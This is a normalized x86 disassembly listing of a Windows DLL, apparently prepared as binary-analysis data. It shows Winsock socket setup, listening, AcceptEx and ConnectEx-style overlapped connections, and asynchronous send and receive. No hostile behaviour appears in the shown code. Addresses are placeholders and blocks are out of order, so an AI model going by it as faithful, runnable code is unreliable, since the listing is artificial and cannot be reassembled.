mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x10 ]
push eax
mov eax [ edx + 0xc ]
push ecx
push 0x0
push eax
call [ PostQueuedCompletionStatus@IAT ]
pop esi
retn
sub_100060b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c9d3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x15c
call sub_10012ca7
mov ebx eax
add esp 0x4
mov [ ebp - 0x10 ] ebx
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub esp 0x14
mov esi esp
mov [ ebp - 0x14 ] esp
mov [ ebp - 0x14 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov eax 0x2
mov [ esi + 0x4 ] ax
mov edx [ edi ]
mov eax [ edx + 0x10 ]
mov ecx edi
call eax
movzx ecx ax
push ecx
call [ htons@IAT ]
mov [ esi + 0x6 ] ax
mov edx [ edi ]
mov eax [ edx + 0xc ]
mov ecx edi
call eax
push eax
call [ htonl@IAT ]
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx ebx
mov [ esi + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
call sub_10006190
sub_10006190
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c98f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x40 ] esi
push esi
mov [ ebp - 0x4 ] 0x0
call sub_10002420
mov [ esi + 0xc ] r--data
mov [ esi ] r--data
mov [ esi + 0xc ] r--data
xor eax eax
mov ebx r--data
mov [ esi + 0x148 ] ebx
mov [ esi + 0x14c ] eax
mov [ esi + 0x150 ] eax
mov [ esi + 0x154 ] eax
mov [ esi + 0x158 ] eax
mov eax [ ebp + 0x8 ]
push 0x1
push 0x0
push 0x0
push 0x6
push 0x1
mov [ ebp - 0x4 ] 0x2
push 0x2
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xffffffff
call [ WSASocketA@IAT ]
mov [ esi + 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
push 0x10
lea edx [ ebp + 0x10 ]
push edx
push eax
call [ bind@IAT ]
test eax eax
jns r-xdata
push r--data
lea ecx [ ebp - 0x38 ]
push ecx
mov [ ebp - 0x38 ] 0x10003
call sub_10013848
xor eax eax
lea ecx [ ebp - 0x38 ]
push ecx
lea edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ esi + 0x14 ]
push edx
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x38 ] 0x10
call [ getsockname@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x28 ]
mov [ esi + 0x14c ] ecx
mov ecx [ ebp - 0x24 ]
mov [ esi + 0x150 ] edx
mov [ esi + 0x154 ] eax
mov [ esi + 0x158 ] ecx
mov edx [ esi + 0x14 ]
push 0x7fffffff
push edx
call [ listen@IAT ]
test eax eax
js r-xdata
push r--data
lea eax [ ebp - 0x38 ]
push eax
mov [ ebp - 0x38 ] 0x10003
call sub_10013848
mov edx [ esi + 0x14 ]
push 0x0
push 0x0
lea eax [ ebp - 0x3c ]
push eax
push 0x4
lea ebx [ esi + 0x1c ]
push ebx
push 0x10
lea ecx [ ebp - 0x20 ]
push ecx
push 0xc8000006
push edx
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x20 ] 0xb5367df1
mov [ ebp - 0x1c ] 0x11cfcbac
mov [ ebp - 0x18 ] 0x8000ca95
mov [ ebp - 0x14 ] 0x92a1485f
mov [ ebx ] 0x0
call [ WSAIoctl@IAT ]
cmp [ ebx ] 0x0
je r-xdata
mov edi [ esi + 0x10 ]
lea eax [ esi + 0xc ]
call sub_100052c0
call sub_10006390
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x18
sub_10006360
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10006430
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10006390
push ebp
mov ebp esp
push ecx
push 0x1
push 0x0
push 0x0
push 0x6
push 0x1
push 0x2
call [ WSASocketA@IAT ]
mov [ esi + 0x18 ] eax
cmp eax 0xffffffff
jne r-xdata
push ebx
push edi
xor eax eax
mov [ esi + 0x20 ] eax
lea edi [ esi + 0x20 ]
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] eax
push edi
mov [ edi + 0x10 ] eax
mov ecx [ esi + 0x18 ]
mov edx [ esi + 0x14 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x1c ]
push 0x20
push 0x20
push 0x0
lea ebx [ esi + 0x48 ]
push ebx
push ecx
push edx
call eax
test eax eax
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
pop edi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
call [ WSAGetLastError@IAT ]
cmp eax 0x3e5
je r-xdata
call [ WSAGetLastError@IAT ]
mov edx [ esi + 0x18 ]
mov eax [ esi + 0x14 ]
push edi
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x1c ]
push 0x20
push 0x20
push 0x0
push ebx
push edx
push eax
mov [ ebp - 0x4 ] 0x0
call ecx
test eax eax
je r-xdata
sub_10006430
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c70f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x14 ] edi
lea eax [ edi + 0xc ]
mov [ edi ] r--data
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x1
mov ecx [ edi + 0x10 ]
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
mov eax ebx
call sub_10005410
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
push edx
push eax
lea esi [ ebp - 0x10 ]
mov eax ebx
call sub_10001d00
mov ecx [ edi + 0x14 ]
push 0x2
push ecx
call [ shutdown@IAT ]
mov edx [ edi + 0x14 ]
push edx
call [ closesocket@IAT ]
mov [ edi + 0x148 ] r--data
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x2
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov [ edi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_10001140
sub_100064f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001ce6b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebp + 0x8 ]
lea ecx [ ebx + 0x14 ]
cmp eax ecx
jne r-xdata
lea ecx [ ebx + 0x28 ]
cmp eax ecx
jne r-xdata
push 0x40
call sub_10012ca7
add esp 0x4
mov [ ebp + 0x8 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ebx - 0xc ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
movzx eax [ ebx + 0x64 ]
push eax
call [ ntohs@IAT ]
mov edx [ ebx + 0x66 ]
movzx ecx ax
push edx
mov [ ebp + 0x8 ] ecx
call [ ntohl@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
xor esi esi
mov eax 0x2
mov [ ebp - 0x20 ] esi
push ecx
mov [ ebp - 0x24 ] r--data
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] ax
call [ htons@IAT ]
mov edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x1e ] ax
call [ htonl@IAT ]
mov ecx [ ebp - 0x20 ]
mov [ edi + 0x28 ] ecx
mov [ edi + 0x2c ] eax
mov [ edi + 0x30 ] esi
mov [ edi + 0x34 ] esi
mov ecx [ ebx - 0x4 ]
lea esi [ ebx - 0xc ]
test ecx ecx
je r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx + 0xc ]
push edx
mov esi eax
call sub_10006640
mov edi eax
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push 0x1
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x0
mov ecx esi
mov [ esi + 0x8 ] edi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
call eax
mov [ esi + 0x8 ] 0x0
mov [ ebx + 0xc ] 0xffffffff
call sub_10006390
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
push 0x5
call eax
sub_10006640
push ebp
mov ebp esp
push ecx
push 0x0
push sub_10005cd0
push sub_10006ca0
push sub_10006af0
sub esp 0x14
mov eax esp
mov [ eax ] r--data
mov [ eax ] r--data
add eax 0x4
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ ebp - 0x4 ] esp
mov [ eax + 0xc ] ecx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push edi
mov [ ebp - 0x4 ] 0x10
call [ getsockname@IAT ]
mov edx [ ebp + 0x8 ]
push edx
push esi
mov ecx edi
call sub_10005800
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov eax esi
mov esp ebp
pop ebp
retn 0x4
sub_100066b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001ce43
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x40
mov [ ebp - 0x4 ] 0x0
call sub_10012ca7
mov ebx eax
add esp 0x4
mov [ ebp - 0x18 ] ebx
test ebx ebx
je r-xdata
xor esi esi
sub esp 0x14
mov edi esp
mov [ ebp - 0x1c ] esp
mov [ ebp - 0x1c ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x2
xor eax eax
mov [ edi ] r--data
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov eax 0x2
mov [ edi + 0x4 ] ax
mov edx [ esi ]
mov eax [ edx + 0x10 ]
mov ecx esi
call eax
movzx eax ax
push eax
call [ htons@IAT ]
mov [ edi + 0x6 ] ax
mov edx [ esi ]
mov eax [ edx + 0xc ]
mov ecx esi
call eax
push eax
call [ htonl@IAT ]
mov ecx [ ebp + 0x8 ]
push ecx
mov esi ebx
mov [ edi + 0x8 ] eax
mov [ ebp - 0x4 ] 0x1
call sub_100067c0
mov esi eax
jmp r-xdata
mov ecx [ esi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax + 0xc ]
call edx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push r--data
lea edx [ ebp - 0x14 ]
push edx
mov [ ebp - 0x14 ] 0x10005
call sub_10013848
mov [ ebp - 0x4 ] 0x0
cmp [ esi + 0x18 ] 0x0
jne r-xdata
sub_100067c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001ce08
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push sub_10006a30
push sub_10005cd0
push sub_10006ca0
push sub_10006b50
push 0x1
push 0x0
push 0x0
push 0x6
push 0x1
push 0x2
mov [ ebp - 0x4 ] 0x0
call [ WSASocketA@IAT ]
sub esp 0x14
mov edx esp
mov [ edx ] r--data
mov [ edx ] r--data
mov ecx [ ebp + 0x10 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp + 0x14 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ edx + 0xc ] ecx
mov ecx [ ebp + 0x1c ]
mov [ edx + 0x10 ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
push edx
push esi
mov ecx eax
call sub_10005800
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x18
sub_10006890
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c510
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
push ebx
lea edx [ ebp - 0x5c ]
push edx
push 0x4
mov edi ecx
mov ecx [ edi + 0x18 ]
lea eax [ ebp - 0x4c ]
push eax
push 0x10
add ecx 0x8
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x20 ] 0x25a207b9
mov [ ebp - 0x1c ] 0x4660ddf3
mov [ ebp - 0x18 ] 0xe576e98e
mov [ ebp - 0x14 ] 0x3e06748c
mov [ ebp - 0x4c ] ebx
mov eax [ ecx ]
push edx
mov edx [ eax + 0x8 ]
push 0xc8000006
call edx
push eax
call [ WSAIoctl@IAT ]
cmp [ ebp - 0x4c ] ebx
jne r-xdata
xor eax eax
mov ecx 0x2
mov [ ebp - 0x30 ] eax
push ebx
mov [ ebp - 0x34 ] r--data
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x30 ] cx
call [ htons@IAT ]
push ebx
mov [ ebp - 0x2e ] ax
call [ htonl@IAT ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] ebx
mov ecx [ edi + 0x18 ]
mov eax [ ecx + 0x8 ]
add ecx 0x8
push 0x10
lea edx [ ebp - 0x30 ]
push edx
mov edx [ eax + 0x8 ]
call edx
push eax
call [ bind@IAT ]
test eax eax
js r-xdata
push r--data
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x50 ] 0x10004
push eax
xor eax eax
lea esi [ edi + 0x4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov ecx [ edi + 0x18 ]
push 0x4
lea edx [ ebp - 0x54 ]
push edx
add ecx 0x8
mov [ ebp - 0x54 ] 0x1
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push 0x1
push 0x6
call edx
push eax
call [ setsockopt@IAT ]
mov ebx [ edi + 0x18 ]
lea eax [ ebp - 0x48 ]
mov ecx ebx
call sub_10006870
push esi
push 0x0
push 0x0
push 0x0
mov [ ebp - 0x4 ] 0x1
mov edx [ ebx + 0x8 ]
lea ecx [ ebx + 0x8 ]
push 0x10
lea eax [ ebp - 0x44 ]
push eax
mov eax [ edx + 0x8 ]
call eax
push eax
call [ ebp - 0x4c ]
test eax eax
jne r-xdata
mov [ edi + 0x1c ] 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
call [ WSAGetLastError@IAT ]
cmp eax 0x3e5
je r-xdata
push r--data
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x58 ] 0x10004
push ecx
jmp r-xdata
call sub_10013848
sub_10006a30
push ebp
mov ebp esp
push 0x20
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] 0x0
pop ebp
retn
sub_10006a70
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn 0x8
push esi
mov esi [ ecx + 0x18 ]
mov [ ecx + 0x1c ] 0x0
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x10 ]
mov [ esi + 0x18 ] 0x0
mov edx [ ecx ]
mov eax [ edx + 0xc ]
push 0x0
push 0x0
call eax
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x0
mov ecx esi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
pop esi
test eax eax
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax 0x1
pop ebp
retn 0x8
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
push 0x4
call eax
sub_10006af0
push ebp
mov ebp esp
push esi
push 0x403c
call sub_10012ca7
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
xor esi esi
mov eax [ esi ]
mov edx [ eax + 0x14 ]
mov ecx esi
call edx
mov eax esi
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ eax + 0x18 ] ecx
mov [ eax + 0x1c ] 0xf
mov [ eax + 0x8 ] cl
mov esi eax
mov [ eax + 0x4 ] edx
mov [ eax + 0x24 ] ecx
mov [ eax ] r--data
mov eax [ esi ]
mov edx [ eax + 0x14 ]
mov ecx esi
call edx
mov eax esi
pop esi
pop ebp
retn
sub_10006b50
push ebp
mov ebp esp
push 0x403c
call sub_10012ca7
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
xor eax eax
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ eax + 0x1c ] 0xf
mov [ eax + 0x18 ] ecx
mov [ eax + 0x8 ] cl
mov [ eax + 0x4 ] edx
mov [ eax + 0x24 ] ecx
mov [ eax ] r--data
pop ebp
retn
sub_10006b90
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
xor ecx ecx
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] ecx
lea eax [ esi + 0x3c ]
mov [ ebp - 0x8 ] eax
lea eax [ esi + 0x28 ]
mov [ eax + 0x8 ] ecx
push 0x0
push eax
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov ecx [ esi + 0x4 ]
lea edx [ ebp - 0x4 ]
push edx
push 0x0
add ecx 0x8
mov [ ebp - 0xc ] 0x4000
mov [ ebp - 0x4 ] 0x0
mov edx [ ecx ]
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ edx + 0x8 ]
call eax
push eax
call [ WSARecv@IAT ]
test eax eax
je r-xdata
mov [ esi + 0x24 ] 0x1
cmp eax 0xffffffff
jne r-xdata
mov esi [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ edx + 0x8 ]
push 0x0
mov ecx esi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x3e5
je r-xdata
mov ecx [ esi + 0x20 ]
mov ecx [ ecx + 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push esi
call eax
pop esi
mov esp ebp
pop ebp
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
push 0x3
call eax
sub_10006c50
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x10
jb r-xdata
xor eax eax
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x18 ] eax
mov [ esi + 0x8 ] al
mov [ esi ] r--data
je r-xdata
mov eax [ esi + 0x8 ]
push eax
call sub_10012c4b
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10006ca0
push ebp
mov ebp esp
push 0x3c
call sub_10012ca7
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
xor eax eax
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ eax + 0x1c ] 0xf
mov [ eax + 0x18 ] ecx
mov [ eax + 0x8 ] cl
mov [ eax + 0x4 ] edx
mov [ eax + 0x24 ] ecx
mov [ eax ] r--data
pop ebp
retn
sub_10006ce0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x1c ] 0x10
lea eax [ esi + 0x8 ]
jb r-xdata
mov ecx [ esi + 0x18 ]
mov [ ebp - 0x8 ] ecx
xor ecx ecx
mov [ esi + 0x28 ] ecx
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x28 ]
mov [ eax + 0x4 ] ecx
push 0x0
mov [ eax + 0x8 ] ecx
push eax
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x8 ]
push 0x0
push 0x0
add ecx 0x8
push 0x1
lea edx [ ebp - 0x8 ]
push edx
mov edx [ eax + 0x8 ]
call edx
push eax
call [ WSASend@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
mov [ esi + 0x24 ] 0x1
cmp eax 0xffffffff
jne r-xdata
mov esi [ esi + 0x4 ]
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x0
mov ecx esi
call edx
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
call [ WSAGetLastError@IAT ]
cmp eax 0x3e5
je r-xdata
mov ecx [ esi + 0x20 ]
mov ecx [ ecx + 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push esi
call eax
pop esi
mov esp ebp
pop ebp
retn
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x4 ]
push 0x3
call eax
sub_10006da0
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push eax
lea ebx [ ebp - 0x20 ]
call sub_10006ec0
mov eax [ ebp - 0x20 ]
add esp 0x4
cmp [ ebp - 0xc ] 0x10
pop ebx
jae r-xdata
push esi
push eax
call [ inet_addr@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x20 ]
push esi
call [ ntohl@IAT ]
mov esi eax
cmp [ ebp - 0xc ] 0x10
mov eax [ ebp - 0x20 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_10012771
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
push ecx
call sub_10012c4b
add esp 0x4
push eax
call [ gethostbyname@IAT ]
mov eax [ eax + 0xc ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
cmp [ ebp - 0xc ] 0x10
jb r-xdata
mov eax [ eax ]
mov esi [ eax ]
jmp r-xdata
sub_10006e30
test ebx ebx
jne r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
lea esp [ esp ]
xor eax eax
retn
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push esi
lea esi [ eax + 0x1 ]
cmp esi 0x1
ja r-xdata
xor ecx ecx
mov eax esi
mov edx 0x2
mul edx
seto cl
push edi
neg ecx
or ecx eax
push ecx
call sub_10012766
mov edi eax
lea eax [ esi + esi ]
push eax
push 0x0
push edi
call sub_10018220
add esp 0x10
lea eax [ esi - 0x1 ]
push eax
push edi
push eax
push ebx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jle r-xdata
push r--data
call [ SysAllocString@IAT ]
pop esi
retn
pop edi
xor eax eax
pop esi
retn
push edi
call [ SysAllocString@IAT ]
push edi
mov esi eax
call sub_10012e64
add esp 0x4
pop edi
mov eax esi
pop esi
retn
sub_10006ec0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d300
mov eax [ fs : 0x0 ]
push eax
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
xor eax eax
mov esi ecx
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x2c ] al
mov [ ebp - 0x4 ] eax
cmp esi eax
jbe r-xdata
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] eax
lea edi [ ebp - 0x2c ]
mov esi ebx
mov [ ebx ] 0x0
call sub_10005ef0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
lea eax [ esi + 0x1 ]
push eax
call sub_10012766
mov edi eax
lea eax [ esi + 0x1 ]
push eax
push 0x0
push edi
call sub_10018220
mov ecx [ ebp - 0x4c ]
add esp 0x10
push 0x0
push 0x0
push esi
push edi
push esi
push ecx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov eax ebx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
push ecx
mov eax edi
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
push edi
call sub_10012e64
mov [ ebx + 0x14 ] 0xf
mov [ ebx + 0x10 ] 0x0
add esp 0x4
lea edi [ ebp - 0x2c ]
mov esi ebx
mov [ ebx ] 0x0
call sub_10005ef0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov esi eax
mov eax edi
lea ecx [ ebp - 0x48 ]
call sub_10004db0
lea edi [ ebp - 0x48 ]
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_10005ef0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x48 ]
push eax
call sub_10012c4b
add esp 0x4
call sub_10012c4b
add esp 0x4
sub_10007020
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cdd3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
movzx eax [ edi + 0x12 ]
mov esi [ edi + 0x14 ]
push eax
call [ ntohs@IAT ]
push esi
movzx ebx ax
call [ ntohl@IAT ]
mov esi eax
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
mov eax 0x2
push ebx
mov [ ebp - 0x24 ] r--data
mov [ ebp - 0x20 ] ax
call [ htons@IAT ]
push esi
mov [ ebp - 0x1e ] ax
call [ htonl@IAT ]
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0x0
mov edx [ edi ]
mov eax [ edx + 0x8 ]
push 0x0
mov ecx edi
call eax
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
mov ecx [ edi + 0x8 ]
mov edx [ ecx ]
mov ebx eax
mov eax [ edx + 0x4 ]
push edi
call eax
push 0x28
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ edi + 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x20 ]
push edi
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
